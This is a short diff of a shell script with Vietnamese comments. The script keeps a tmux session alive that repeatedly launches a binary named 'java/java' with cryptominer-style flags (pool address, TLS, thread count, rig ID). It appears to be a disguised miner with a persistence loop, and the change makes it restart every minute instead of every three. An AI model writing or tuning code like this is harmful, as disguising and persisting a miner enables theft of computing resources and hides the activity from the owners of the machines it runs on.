@@ -28,7 +28,7 @@ if [ ! -f "$(pwd)/java/java" ]; then
 fi
 
 # 🔁 Kiểm tra và chạy lại nếu session không tồn tại
-echo "[+] Vòng lặp kiểm tra session mỗi 3 phút ..."
+echo "[+] Vòng lặp kiểm tra session mỗi 1 phút ..."
 while true; do
     if ! tmux has-session -t $SESSION 2>/dev/null; then
         tmux new-session -s $SESSION -d
@@ -36,7 +36,7 @@ while true; do
             $(pwd)/java/java -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK
         " C-m
     else
-        echo "[+] start process start process start process start process start process start process - chạy 3 phút check lai..."
+        echo "[+] start process start process start process start process start process start process - chạy 1 phút check lai..."
     fi
-    sleep 180   # 3 phút check 1 lần
+    sleep 60   # 3 phút check 1 lần
 done
